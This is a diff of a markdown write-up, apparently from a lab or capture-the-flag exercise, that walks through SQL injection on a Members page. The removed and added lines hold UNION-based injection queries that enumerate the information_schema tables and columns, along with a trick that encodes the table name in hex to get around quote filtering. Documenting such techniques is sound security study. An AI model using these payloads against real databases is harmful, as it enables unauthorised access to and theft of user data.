@@ -23,13 +23,7 @@ A SQL Injection vulnerability found on the Members page allows attackers to expl
 - Result: Reveals all Table names
 
 ### 3. Enumerate Structure
-- Query: `-1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database() --`
-- Result: Lists table/column names (e.g., `users`, `user_id`, `first_name`, `Commentaire`, `countersign`, etc.)
-
-another option is directly using hex value of the Table "users" which is 0x7573657273
-since using quote i.e. FROM "users" is not possible
-
-- Query: `-1 union select column_name, table_name FROM information_schema.columns WHERE table_name LIKE 0x7573657273`
+- Query: `-1 UNION SELECT table_name, column_name FROM information_schema.columns`
 - Result: Lists table/column names (e.g., `users`, `user_id`, `first_name`, `Commentaire`, `countersign`, etc.)
 
 ### 4. Dump User Data
